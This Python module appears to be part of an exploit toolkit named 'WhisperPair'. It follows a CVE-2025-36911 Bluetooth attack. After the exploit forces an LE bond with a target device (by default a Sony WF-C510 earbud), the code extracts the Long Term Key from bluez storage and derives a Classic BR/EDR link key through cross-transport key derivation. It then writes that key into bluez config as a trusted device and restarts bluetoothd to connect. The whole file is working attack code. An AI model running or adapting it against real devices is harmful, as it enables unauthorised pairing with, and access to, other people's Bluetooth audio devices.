"""
Cross-Transport Key Derivation (CTKD) for WhisperPair

Derives a BR/EDR Link Key from a BLE Long Term Key (LTK) per
Bluetooth Core Spec Vol 3, Part H, Section 2.4.2.5.

This allows the laptop to create a Classic BT bond from the LE bond
established during the CVE-2025-36911 exploit, without needing the
device to be in Classic BT pairing mode.

Flow:
  1. Pair via BLE (exploit does KBP + creates LE bond)
  2. Extract LTK from bluez config
  3. Derive BR/EDR Link Key via h6(h7(LTK))
  4. Inject Link Key into bluez config for the BR/EDR address
  5. Restart bluetoothd
  6. Connect via Classic BT using the derived key
"""

import os
import configparser
import subprocess
import glob

from cryptography.hazmat.primitives import cmac
from cryptography.hazmat.primitives.ciphers import algorithms


def aes_cmac(key: bytes, message: bytes) -> bytes:
    """AES-CMAC per RFC 4493."""
    c = cmac.CMAC(algorithms.AES(key))
    c.update(message)
    return c.finalize()


def h7(salt: bytes, w: bytes) -> bytes:
    """h7(SALT, W) = AES-CMAC_SALT(W)
    Salt is padded to 16 bytes with zeros."""
    salt_padded = (salt + b'\x00' * 16)[:16]
    return aes_cmac(salt_padded, w)


def h6(w: bytes, key_id: bytes) -> bytes:
    """h6(W, keyID) = AES-CMAC_W(keyID)"""
    return aes_cmac(w, key_id)


def derive_link_key(ltk: bytes) -> bytes:
    """Derive BR/EDR Link Key from LE LTK via CTKD.

    Link_Key = h6(h7("ble salt", LTK), "Link Key")
    """
    intermediate = h7(b"ble salt", ltk)
    return h6(intermediate, b"Link Key")


def find_adapter_address():
    """Find the local Bluetooth adapter address from bluez storage."""
    bt_dir = "/var/lib/bluetooth"
    if not os.path.isdir(bt_dir):
        return None
    for entry in os.listdir(bt_dir):
        if ":" in entry and len(entry) == 17:
            return entry
    return None


def find_le_device(adapter_addr, device_name_hint=None):
    """Find an LE-paired device in bluez storage and return (path, address, info)."""
    base = f"/var/lib/bluetooth/{adapter_addr}"
    if not os.path.isdir(base):
        return None, None, None

    for dev_dir in os.listdir(base):
        info_path = os.path.join(base, dev_dir, "info")
        if not os.path.isfile(info_path):
            continue

        config = configparser.ConfigParser()
        config.read(info_path)

        # Check if it has an LTK (LE paired)
        if not config.has_section("LongTermKey"):
            continue

        name = config.get("General", "Name", fallback="")
        if device_name_hint and device_name_hint.lower() not in name.lower():
            continue

        return info_path, dev_dir, config

    return None, None, None


def extract_ltk(config):
    """Extract the Long Term Key from a bluez device info config."""
    if not config.has_section("LongTermKey"):
        return None
    key_hex = config.get("LongTermKey", "Key", fallback=None)
    if not key_hex:
        return None
    return bytes.fromhex(key_hex)


def inject_link_key(adapter_addr, bredr_address, link_key, device_name="WF-C510"):
    """Write a BR/EDR Link Key into bluez's storage for the given address.

    Creates or updates /var/lib/bluetooth/<adapter>/<bredr_addr>/info
    with the derived link key.
    """
    dev_dir = bredr_address.upper().replace(":", "_")
    base = f"/var/lib/bluetooth/{adapter_addr}/{dev_dir}"
    info_path = os.path.join(base, "info")

    os.makedirs(base, exist_ok=True)

    config = configparser.ConfigParser()
    if os.path.exists(info_path):
        config.read(info_path)

    if not config.has_section("General"):
        config.add_section("General")
    config.set("General", "Name", device_name)
    config.set("General", "Class", "0x240404")  # Audio device
    config.set("General", "AddressType", "public")
    config.set("General", "SupportedTechnologies", "BR/EDR;")
    config.set("General", "Trusted", "true")
    config.set("General", "Blocked", "false")

    if not config.has_section("LinkKey"):
        config.add_section("LinkKey")
    config.set("LinkKey", "Key", link_key.hex().upper())
    config.set("LinkKey", "Type", "4")  # Authenticated combination key from CTKD
    config.set("LinkKey", "PINLength", "0")

    with open(info_path, "w") as f:
        config.write(f)

    return info_path


def perform_ctkd(ble_device_hint, bredr_address, device_name="WF-C510"):
    """Full CTKD flow:
    1. Find the LE device in bluez storage
    2. Extract LTK
    3. Derive BR/EDR Link Key
    4. Inject into bluez storage
    5. Restart bluetoothd

    Returns (success, message, link_key_hex)
    """
    adapter = find_adapter_address()
    if not adapter:
        return False, "No Bluetooth adapter found in /var/lib/bluetooth", None

    # Find the LE device
    info_path, dev_addr, config = find_le_device(adapter, ble_device_hint)
    if not config:
        return False, f"No LE-paired device matching '{ble_device_hint}' found", None

    # Extract LTK
    ltk = extract_ltk(config)
    if not ltk:
        return False, f"No LTK found for {dev_addr}", None

    # Derive Link Key
    link_key = derive_link_key(ltk)

    # Inject into bluez storage
    injected_path = inject_link_key(adapter, bredr_address, link_key, device_name)

    # Restart bluetoothd to pick up new key
    subprocess.run(["systemctl", "restart", "bluetooth"], capture_output=True, timeout=10)
    import time
    time.sleep(3)

    return True, f"CTKD complete. LTK={ltk.hex()}, LinkKey={link_key.hex()}, written to {injected_path}", link_key.hex()


if __name__ == "__main__":
    import sys
    hint = sys.argv[1] if len(sys.argv) > 1 else "WF-C510"
    bredr = sys.argv[2] if len(sys.argv) > 2 else "00:A4:1C:A0:35:FE"

    success, msg, key = perform_ctkd(hint, bredr)
    print(msg)
    if success:
        print(f"\nNow try: bluetoothctl connect {bredr}")
